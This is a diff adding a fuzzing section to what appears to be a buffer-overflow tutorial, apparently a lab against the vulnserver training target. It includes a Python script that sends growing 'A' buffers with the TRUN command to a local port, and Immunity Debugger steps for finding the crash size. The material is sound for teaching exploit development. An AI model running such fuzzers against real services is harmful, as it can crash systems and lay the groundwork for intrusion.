@@ -84,6 +84,38 @@ After you utilize the command.spk, look to see if there's an Access Violation in
 
 ## Fuzzing
 Fuzzing is to test the application is veunerable on the found exploitable input (We need to send enough data to crash the application)
-Fuzzing can be done manually or with help from 
+
+fuzz.py Script
+```python
+#!/usr/bin/python
+from __future__ import print_function
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+        try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('127.0.0.1',9999))
+
+                s.send(('TRUN /.:/' + buffer))
+                s.close()
+                sleep(1)
+                buffer = buffer + "A"*100
+
+        except:
+                print("Fuzzing crashed at %s bytes" % str(len(buffer)))
+```
+
+Edit the provided fuzz.py script. Replace the IP, PORT, and TRUN command with the IP, port, and command you want to test.
+Restart Immunity debugger + the Exe and attach as you did previously.
+Run the script 
+```console
+Command: python fuzz.py
+```
+Try to use CTRL+C to stop the script exactly when you see an Access Violation pop-up in Immunity. Doing so will ensure you can more accurately estimate the bytes it took to crash it.
+Write down the number of bytes it took to crash the program.
+
 
 
